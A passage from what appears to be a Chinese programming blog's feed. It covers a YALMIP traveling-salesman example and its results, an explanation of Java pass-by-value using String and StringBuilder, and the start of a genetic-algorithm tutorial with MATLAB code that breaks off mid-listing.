class="line">    value(x)</span><br><span class="line">    value(z)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">disp</span>(<span class="string">&#x27;求解过程中出错&#x27;</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用到的<code>tsp_dist_matrix.txt</code>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">7</span> <span class="number">4</span> <span class="number">5</span> <span class="number">8</span> <span class="number">6</span> <span class="number">12</span> <span class="number">13</span> <span class="number">11</span> <span class="number">18</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span>  <span class="number">3</span> <span class="number">10</span> <span class="number">9</span> <span class="number">14</span> <span class="number">5</span> <span class="number">14</span> <span class="number">17</span> <span class="number">17</span></span><br><span class="line"><span class="number">4</span> <span class="number">3</span> <span class="number">0</span> <span class="number">5</span> <span class="number">9</span> <span class="number">10</span> <span class="number">21</span> <span class="number">8</span> <span class="number">27</span> <span class="number">12</span></span><br><span class="line"><span class="number">5</span> <span class="number">10</span> <span class="number">5</span> <span class="number">0</span> <span class="number">14</span> <span class="number">9</span> <span class="number">10</span> <span class="number">9</span> <span class="number">23</span> <span class="number">16</span></span><br><span class="line"><span class="number">8</span> <span class="number">9</span> <span class="number">9</span> <span class="number">14</span> <span class="number">0</span> <span class="number">7</span> <span class="number">8</span> <span class="number">7</span> <span class="number">20</span> <span class="number">19</span></span><br><span class="line"><span class="number">6</span> <span class="number">14</span> <span class="number">10</span> <span class="number">9</span> <span class="number">7</span> <span class="number">0</span> <span class="number">13</span> <span class="number">5</span> <span class="number">25</span> <span class="number">13</span></span><br><span class="line"><span class="number">12</span> <span class="number">5</span> <span class="number">21</span> <span class="number">10</span> <span class="number">8</span> <span class="number">13</span> <span class="number">0</span> <span class="number">23</span> <span class="number">21</span> <span class="number">18</span></span><br><span class="line"><span class="number">13</span> <span class="number">14</span> <span class="number">8</span> <span class="number">9</span> <span class="number">7</span> <span class="number">5</span> <span class="number">23</span> <span class="number">0</span> <span class="number">18</span> <span class="number">12</span></span><br><span class="line"><span class="number">11</span> <span class="number">17</span> <span class="number">27</span> <span class="number">23</span> <span class="number">20</span> <span class="number">25</span> <span class="number">21</span> <span class="number">18</span> <span class="number">0</span> <span class="number">16</span></span><br><span class="line"><span class="number">18</span> <span class="number">17</span> <span class="number">12</span> <span class="number">16</span> <span class="number">19</span> <span class="number">13</span> <span class="number">18</span> <span class="number">12</span> <span class="number">16</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>最后来看看结果吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; value(x)</span><br><span class="line"></span><br><span class="line">ans =</span><br><span class="line"></span><br><span class="line">   NaN     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>   NaN     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>   NaN     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span>   NaN     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>   NaN     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span>   NaN     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>   NaN     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span>   NaN     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>   NaN     <span class="number">1</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span>   NaN</span><br><span class="line"></span><br><span class="line">&gt;&gt; value(z)</span><br><span class="line"></span><br><span class="line">ans =</span><br><span class="line"></span><br><span class="line">    <span class="number">77</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后，发现了<code>yalmip</code>的一个<code>bug</code>，在书写<code>yalmip</code>的约束条件时，如下：<br><code>x(1) + x(2)-2 &gt;= 0</code><br>注意x(2)-2这个-2是紧贴x(2)的。这样求解释正确的，如果换成<br><code>x(1) + x(2) -2 &gt;= 0</code><br><code>x(2)-2</code>这个<code>-2</code>不是紧贴<code>x(2)</code>的。这样求解则会出现问题。</p><p><strong>建议把所有常数写在等式的右边</strong></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Yalmip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中的值传递和引用传递</title>
      <link href="/archives/41d67bcb.html"/>
      <url>/archives/41d67bcb.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h2><p>被java中的“值传递”和“引用传递”困扰过一阵子，在实际代码中也犯过不少错，记录一下，方便查看。</p><a id="more"></a><h2 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题"></a>1.问题</h2><p>首先看看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        change(str);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">    str = <span class="string">&quot;456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么你觉得会输出多少呢？至少我曾经觉得是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure><p>但是，正确答案是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>这是为什么呢？我相信答错的同学大都是受到了一些”java教材“的影响–java的参数传递有两种：</p><ol><li>值传递，传递值，在函数中形参发生的变化不影响实参。</li><li>引用传递，传递对象引用，在函数中形参发生的变化影响实参。</li></ol><p><strong>然而，实际上java参数传递只有一种情况，那就是值传递。所不同的是，一般说的”引用传递”，在实际中传递的不过是引用对象的地址值</strong></p><p>在解释上述代码前，先要在补充一点知识：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String a &#x3D; new String(&quot;123&quot;);</span><br><span class="line">String b;</span><br><span class="line">b&#x3D; new String(&quot;123&quot;);</span><br></pre></td></tr></table></figure><p>两种形式的代码所形成的的结果是完全一致的，后面一种更容易理解java中的引用与对象的具体含义。<strong>先声明一个String对象的引用，再new一个“123”对象，最后将这个对象赋值（等号=）给该引用</strong>。</p><ol><li>b：对象的引用</li><li>“123”：实际对象</li></ol><p>好了，现在来具体解释一下<strong>值传递</strong>和<strong>地址值</strong>引用吧。</p><h4 id="1-值"><a href="#1-值" class="headerlink" title="1.值"></a>1.值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int a &#x3D; 1;</span><br><span class="line">void f(int b)&#123;</span><br><span class="line">  b &#x3D;2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a是多少呢？肯定是1嘛。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5df451253d178d9d315.png" alt="image.png"></p><p>将a的值1传递给b，b的值为1.这样不论b如何更改，并不影响a的值。</p><h4 id="2-地址值"><a href="#2-地址值" class="headerlink" title="2.地址值"></a>2.地址值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String a &#x3D; new String(&quot;123&quot;;)</span><br><span class="line">void main(String b)&#123;</span><br><span class="line">  b &#x3D; new String(&quot;345&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.superbed.cn/item/5cfbb5e0451253d178d9d34b.png" alt="image.png"><br>首先，<strong>a将对象“123”的地址值传递给b，b指向”123”的地址</strong>。</p><p>之后 new了一个”345”对象，<strong>b重新指向了”345”**，也就是下图。<br><img data-src="https://pic.superbed.cn/item/5cfbb5e2451253d178d9d37a.png" alt="image.png"><br>所以，仅仅是b的引用对象发生了变化，a的引用对象毫无改变。<br>**现在能够解释文首的问题了。</strong>But,there is one more thing.</p><p>如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"> public static void main(String[] args) &#123;</span><br><span class="line"> StringBuilder a &#x3D; new StringBuilder(&quot;123&quot;);</span><br><span class="line"> change(a);</span><br><span class="line"> System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void change(StringBuilder str)&#123;</span><br><span class="line">    str.append(&quot;345&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在，a的值是多少？</p><p>答案是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123345</span><br></pre></td></tr></table></figure><p>这也就是平常我们所理解的，传递“引用”会影响原对象本身。还是画个图来解释：<br><img data-src="https://pic2.superbed.cn/item/5cfbb5e8451253d178d9d3f4.png" alt="image.png"></p><p>首先a将“123”对象的地址传递给b，b指向“123”，接着通过“绿色”引用改变了“123”对象。因为a也是指向“123”对象，所以输出a也变为了”123345”。</p><p>That’s all.Hope you have understood。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>遗传算法及其MATLAB实现</title>
      <link href="/archives/c9ca9c00.html"/>
      <url>/archives/c9ca9c00.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-遗传算法基本原理"><a href="#1-遗传算法基本原理" class="headerlink" title="1. 遗传算法基本原理"></a>1. 遗传算法基本原理</h2><h3 id="1-1-遗传算法基础"><a href="#1-1-遗传算法基础" class="headerlink" title="1.1 遗传算法基础"></a>1.1 遗传算法基础</h3><p>种群是生物进化的基本单位的，生物进化的实质是种群基本频率的改变。基因突变和基因重组、自然选择以及隔离是物种形成过程中的三个基本环节，通过他们的综合作用，种群产生分化，最终导致新物种的形成。</p><a id="more"></a><h3 id="1-2-遗传算法实现步骤"><a href="#1-2-遗传算法实现步骤" class="headerlink" title="1.2 遗传算法实现步骤"></a>1.2 遗传算法实现步骤</h3><h5 id="1-编码"><a href="#1-编码" class="headerlink" title="1. 编码"></a>1. 编码</h5><p>遗传算法的编码有浮点编码和二进制编码两种。这里介绍为禁止编码。设某一参数的取值范围为$（L,U）$，使用长度为k的二进制编码表示改参数，则它共有$2^k$中不同的编码，每相邻的编码的两个编码的间隔是$\Delta$，容易知道</p><p>$\Delta= \frac{(U-L)}{(2^k-1)}$ </p><h5 id="2-解码"><a href="#2-解码" class="headerlink" title="2. 解码"></a>2. 解码</h5><p><strong>解码的目的就是将不直观的二进制数据串还原成十进制。</strong></p><p>遗传算法的编码和解码在宏观上可以对应生物的基因型和表现型，在围观上可以对应DNA的转录和翻译两个过程。</p><h5 id="3-交配"><a href="#3-交配" class="headerlink" title="3. 交配"></a>3. 交配</h5><p>“交配运算”是使用单点或者多点进行交叉的算子。首先用随机数产生一个或者多个叫叫配电的位置，然后两个个题在叫配电位置互换部分基因码，形成两个子个体。如下图：</p><p><img data-src="https://pic.superbed.cn/item/5cfbad5d451253d178d9531f.jpg" alt="交配运算"></p><p><strong>两个基因在”/“处进行了交换</strong></p><h5 id="4-突变"><a href="#4-突变" class="headerlink" title="4.突变"></a>4.突变</h5><p>“突变运算”是使用基本位进行基因突变 。例如，将染色体S=11001101第3位上的0变为1，即S = 11101101=S’.S’可以被看做是原染色S的子代染色体。</p><h5 id="5-倒位"><a href="#5-倒位" class="headerlink" title="5.倒位"></a>5.倒位</h5><p>将染色体基因的一部分进行逆序排列。例如：S = 100/1100/11,倒位以后为S’ = 100/0011/11.</p><h5 id="6-个体适应度评估"><a href="#6-个体适应度评估" class="headerlink" title="6.个体适应度评估"></a>6.个体适应度评估</h5><p> 遗传算法依照与个体适应度成正比的几率决定当前种群中各个个体遗传都下一代群体中的机会。通常求<strong>目标函数最大值的问题可以直接把目标函数作为检测个体适应度大小的函数</strong>。</p><h5 id="7-复制"><a href="#7-复制" class="headerlink" title="7.复制"></a>7.复制</h5><p> 复制运算时根据个体适应度大小决定其下代遗传的可能性。弱设种群中个体总数为N，个体i的适应度为fi，则个体i被选取的几率为：<br>$Pi = \frac{f_i}{总适应度}$</p><h2 id="2-遗传算法的MATLAB程序设计"><a href="#2-遗传算法的MATLAB程序设计" class="headerlink" title="2. 遗传算法的MATLAB程序设计"></a>2. 遗传算法的MATLAB程序设计</h2><h3 id="2-1-程序设计流程及参数选取"><a href="#2-1-程序设计流程及参数选取" class="headerlink" title="2.1 程序设计流程及参数选取"></a>2.1 程序设计流程及参数选取</h3><h4 id="1-伪代码"><a href="#1-伪代码" class="headerlink" title="1.伪代码"></a>1.伪代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">% 遗传算法的伪代码</span><br><span class="line">BEGIN</span><br><span class="line">   t &#x3D; 0;  %遗传代数</span><br><span class="line">   初始化P(t);%初始化种群或者染色体</span><br><span class="line">   计算P(t)的适应值;</span><br><span class="line">   while(不满足停止准则) do</span><br><span class="line">       begin</span><br><span class="line">       t &#x3D; t+1;</span><br><span class="line">       从P(t-1)中选择P(t); %选择</span><br><span class="line">       重组P(t);</span><br><span class="line">       计算P(t)的适应值;</span><br><span class="line">        end</span><br><span class="line">   end</span><br><span class="line">END</span><br></pre></td></tr></table></figure><h4 id="2-遗传算法的参数设计原则"><a href="#2-遗传算法的参数设计原则" class="headerlink" title="2.遗传算法的参数设计原则"></a>2.遗传算法的参数设计原则</h4><p>1.种群的规模<br>种群不宜过大也不宜过小。种群规模的一个建议值为<strong>0-100</strong>。</p><p>2.变异概率<br>变异概率也不宜过大或者过小。一般取值为<strong>0.0001-0.2</strong></p><p>3.交配概率<br>同上，不宜过大或者过小。一般取值 为<strong>0.4-0.99</strong></p><p>4.进化代数<br>同上，不宜过大或者过小。一般取值为<strong>100-500</strong>。</p><p>5.种群初始化<br>初始种群的生成是随机的。在出是种群的赋予之前，尽量进行一个大概的区间估计，避免初始种群分布在远离最优解的编码空间，导致遗传算法的搜索范围受到限制。</p><h4 id="3-遗传算法适应度函数设计"><a href="#3-遗传算法适应度函数设计" class="headerlink" title="3.遗传算法适应度函数设计"></a>3.遗传算法适应度函数设计</h4><p>1.遗传算法和直接搜索工具箱中的函数ga是求解目标函数的最小值，所以如果目标函数为求解最小值，则直接令目标函数为适应度函数即可。编写的适应度函数，语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function f &#x3D; fitnesscn(x)</span><br><span class="line">f &#x3D; f(x);</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>2.如果有约束条件（包括自变量的取值范围），对于求解函数的最小值问题，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function f &#x3D; fitnessfcx(x)</span><br><span class="line">    if x&lt;&#x3D;-1||x&gt;3</span><br><span class="line">        f &#x3D; inf;</span><br><span class="line">    else</span><br><span class="line">        f &#x3D; f(x);</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>3.如果有约束条件（包括自变量的取值范围），对于求解函数的最大值问题，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function f &#x3D; fitnessfcx(x)</span><br><span class="line">    if x&lt;&#x3D;-1||x&gt;3</span><br><span class="line">        f &#x3D; inf;</span><br><span class="line">    else</span><br><span class="line">        f &#x3D; -f(x);</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><strong>注意：最后求解出来的目标函数为-fval而不是fval</strong></p><h2 id="3-遗传算法应用案例"><a href="#3-遗传算法应用案例" class="headerlink" title="3. 遗传算法应用案例"></a>3. 遗传算法应用案例</h2><p>这里给出三个案例。<br><strong>案例一：无约束目标函数的最大值</strong><br>求解 $max f(x) = 200 \times e^{(-0.05x)} \times sinx ;x∈[-2,2]$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">% 案例一：无约束目标函数的最大值</span><br><span class="line">% 求解maxf(x)&#x3D;200*e(−0.05x)*sinx; x∈[−2,2]</span><br><span class="line">%主程序：用遗传算法求解y&#x3D;200*exp(-0.05*x).*sin(x)在[-2 2]区间上的最大值</span><br><span class="line">clc;</span><br><span class="line">clear ;</span><br><span class="line">close all;</span><br><span class="line">global BitLength</span><br><span class="line">global boundsbegin</span><br><span class="line">global boundsend</span><br><span class="line">bounds&#x3D;[-2 2];%一维自变量的取值范围</span><br><span class="line">precision&#x3D;0.0001; %运算精度</span><br><span class="line">boundsbegin&#x3D;bounds(:,1);</span><br><span class="line">boundsend&#x3D;bounds(:,2);</span><br><span class="line">%计算如果满足求解精度至少需要多长的染色体</span><br><span class="line">BitLength&#x3D;ceil(log2((boundsend-boundsbegin)&#39; .&#x2F; precision));</span><br><span class="line">popsize&#x3D;50; %初始种群大小</span><br><span class="line">Generationnmax&#x3D;12;  %最大代数</span><br><span class="line">pcrossover&#x3D;0.90; %交配概率</span><br><span class="line">pmutation&#x3D;0.09; %变异概率</span><br><span class="line">%产生初始种群</span><br><span class="line">population&#x3D;round(rand(popsize,BitLength));</span><br><span class="line">%计算适应度,返回适应度Fitvalue和累积概率cumsump</span><br><span class="line">[Fitvalue,cumsump]&#x3D;fitnessfun(population);</span><br><span class="line">Generation&#x3D;1;</span><br><span class="line">while Generation&lt;Generationnmax+1</span><br><span class="line">    for j&#x3D;1:2:popsize</span><br><span class="line">        %选择操作</span><br><span class="line">        seln&#x3D;selection(population,cumsump);</span><br><span class="line">        %交叉操作</span><br><span class="line">        scro&#x3D;crossover(population,seln,pcrossover);</span><br><span class="line">        scnew(j,:)&#x3D;scro(1,:);</span><br><span class="line">        scnew(j+1,:)&#x3D;scro(2,:);</span><br><span class="line">        %变异操作（在原交叉基础上有进行变异)</span><br><span class="line">        smnew(j,:)&#x3D;mutation(scnew(j,:),pmutation);</span><br><span class="line">        smnew(j+1,:)&#x3D;mutation(scnew(j+1,:),pmutation);</span><br><span class="line">    end</span><br><span class="line">    population&#x3D;smnew;  %产生了新的种群</span><br><span class="line">    %计算新种群的适应度</span><br><span class="line">    [Fitvalue,cumsump]&#x3D;fitnessfun(population);</span><br><span class="line">    %记录当前代最好的适应度和平均适应度</span><br><span class="line">    [fmax,nmax]&#x3D;max(Fitvalue);</span><br><span class="line">    fmean&#x3D;mean(Fitvalue);</span><br><span class="line">    ymax(Generation)&#x3D;fmax;</span><br><span class="line">    ymean(Generation)&#x3D;fmean;</span><br><span class="line">    %记录当前代的最佳染色体个体</span><br><span class="line">    x&#x3D;transform2to10(population(nmax,:));</span><br><span class="line">    %自变量取值范围是[-2 2],需要把经过遗传运算的最佳染色体整合到[-2 2]区间</span><br><span class="line">    xx&#x3D;boundsbegin+x*(boundsend-boundsbegin)&#x2F;(power((boundsend),BitLength)-1);</span><br><span class="line">    xmax(Generation)&#x3D;xx;</span><br><span class="line">    Generation&#x3D;Generation+1</span><br><span class="line">end</span><br><span class="line">Generation&#x3D;Generation-1;</span><br><span class="line">Bestpopulation&#x3D;xx</span><br><span class="line">Besttargetfunvalue&#x3D;targetfun(xx)</span><br><span class="line">%绘制经过遗传运算后的适应度曲线。一般地，如果进化过程中种群的平均适应度与最大适</span><br><span class="line">%应度在曲线上有相互趋同的形态，表示算法收敛进行得很顺利，没有出现震荡；在这种前</span><br><span class="line">%提下，最大适应度个体连续若干代都没有发生进化表明种群已经成熟。</span><br><span class="line">figure(1);</span><br><span class="line">hand1&#x3D;plot(1:Generation,ymax);</span><br><span class="line">set(hand1,&#39;linestyle&#39;,&#39;-&#39;,&#39;linewidth&#39;,1.8,&#39;marker&#39;,&#39;*&#39;,&#39;markersize&#39;,6)</span><br><span class="line">hold on;</span><br><span class="line">hand2&#x3D;plot(1:Generation,ymean);</span><br><span class="line">set(hand2,&#39;color&#39;,&#39;r&#39;,&#39;linestyle&#39;,&#39;-&#39;,&#39;linewidth&#39;,1.8,...</span><br><span class="line">    &#39;marker&#39;,&#39;h&#39;,&#39;markersize&#39;,6)</span><br><span class="line">xlabel(&#39;进化代数&#39;);ylabel(&#39;最大&#x2F;平均适应度&#39;);xlim([1 Generationnmax]);</span><br><span class="line">legend(&#39;最大适应度&#39;,&#39;平均适应度&#39;);</span><br><span class="line">box off;hold off;</span><br><span class="line"></span><br><span class="line">%子程序：新种群交叉操作,函数名称存储为crossover.m</span><br><span class="line">function scro&#x3D;crossover(population,seln,pc)</span><br><span class="line">BitLength&#x3D;size(population,2);</span><br><span class="line">pcc&#x3D;IfCroIfMut(pc);  %根据交叉概率决定是否进行交叉操作，1则是，0则否</span><br><span class="line">if pcc&#x3D;&#x3D;1</span><br><span class="line">    chb&#x3D;round(rand*(BitLength-2))+1;  %在[1,BitLength-1]范围内随机产生一个交叉位</span><br><span class="line">    scro(1,:)&#x3D;[population(seln(1),1:chb) population(seln(2),chb+1:BitLength)];</span><br><span class="line">    scro(2,:)&#x3D;[population(seln(2),1:chb) population(seln(1),chb+1:BitLength)];</span><br><span class="line">else</span><br><span class="line">    scro(1,:)&#x3D;population(seln(1),:);</span><br><span class="line">    scro(2,:)&#x3D;population(seln(2),:);</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">%子程序：计算适应度函数, 函数名称存储为fitnessfun</span><br><span class="line">function [Fitvalue,cumsump]&#x3D;fitnessfun(population)</span><br><span class="line">global BitLength</span><br><span class="line">global boundsbegin</span><br><span class="line">global boundsend</span><br><span class="line">popsize&#x3D;size(population,1);   %有popsize个个体</span><br><span class="line">for i&#x3D;1:popsize</span><br><span class="line">    x&#x3D;transform2to10(population(i,:));  %将二进制转换为十进制</span><br><span class="line">    %转化为[-2,2]区间的实数</span><br><span class="line">    xx&#x3D;boundsbegin+x*(boundsend-boundsbegin)&#x2F;(power((boundsend),BitLength)-1);</span><br><span class="line">    Fitvalue(i)&#x3D;targetfun(xx);  %计算函数值，即适应度</span><br><span class="line">end</span><br><span 